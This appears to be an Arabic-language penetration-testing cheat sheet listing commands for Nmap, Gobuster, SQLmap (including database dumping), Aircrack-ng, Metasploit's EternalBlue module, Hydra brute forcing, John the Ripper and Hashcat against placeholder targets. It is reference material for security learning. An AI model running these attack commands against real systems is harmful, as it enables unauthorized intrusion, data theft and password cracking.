🔍 جمع المعلومات وفحص الشبكات
🎯 Nmap - فحص الشبكات
الأمر الوظيفة إجراء
nmap 192.168.1.1 فحص جميع المنافذ
nmap -O 192.168.1.1 كشف نظام التشغيل
nmap --script vuln 192.168.1.1 فحص الثغرات
🚀 Gobuster - تخمين المسارات
الأمر الوظيفة إجراء
gobuster dir -u http://target.com -w wordlist.txt البحث عن مجلدات
gobuster dns -d target.com -w wordlist.txt البحث عن نطاقات فرعية
🌐 اختبار اختراق المواقع
💉 SQLmap - حقن قاعدة البيانات
الأمر الوظيفة إجراء
sqlmap -u "http://target.com/page.php?id=1" فحص الثغرة
sqlmap -u "http://target.com/page.php?id=1" --dump استخراج البيانات
📡 اختبار الشبكات اللاسلكية
🔓 Aircrack-ng
الأمر الوظيفة إجراء
sudo airmon-ng start wlan0 تفعيل وضع المراقبة
sudo airodump-ng wlan0mon مسح الشبكات
⚡ استغلال الثغرات
🎯 Metasploit
الأمر الوظيفة إجراء
msfconsole تشغيل المنصة
use exploit/windows/smb/ms17_010_eternalblue تحديد استغلال
🔑 كسر كلمات المرور
💧 Hydra
الأمر الوظيفة إجراء
hydra -l admin -P wordlist.txt ssh://192.168.1.1 هجوم SSH
hydra -L users.txt -P wordlist.txt ftp://192.168.1.1 هجوم FTP
🔨 John the Ripper
الأمر الوظيفة إجراء
john --wordlist=wordlist.txt hashes.txt كسر التجزئة
⚡ Hashcat
الأمر الوظيفة إجراء
hashcat -m 0 -a 0 hashes.txt wordlist.txt كسر MD5
